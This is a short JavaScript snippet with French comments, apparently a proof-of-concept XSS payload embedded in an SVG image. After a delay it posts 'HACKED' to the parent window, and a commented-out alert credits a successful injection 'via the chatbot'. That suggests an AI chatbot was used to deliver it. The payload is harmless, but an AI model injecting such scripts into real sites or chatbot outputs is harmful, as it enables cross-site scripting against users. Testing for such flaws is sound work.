svg.script:
// On attend que l'image soit chargée
setTimeout(() => {
    // On signale au site parent (le site événementiel) qu'on a pris le contrôle
    // window.top fait référence à la fenêtre principale du navigateur
    window.top.postMessage('HACKED', '*');
    
    // On peut aussi faire une petite alerte pour être sûr
    // alert("Injection XSS réussie via le Chatbot !");
}, 1000);
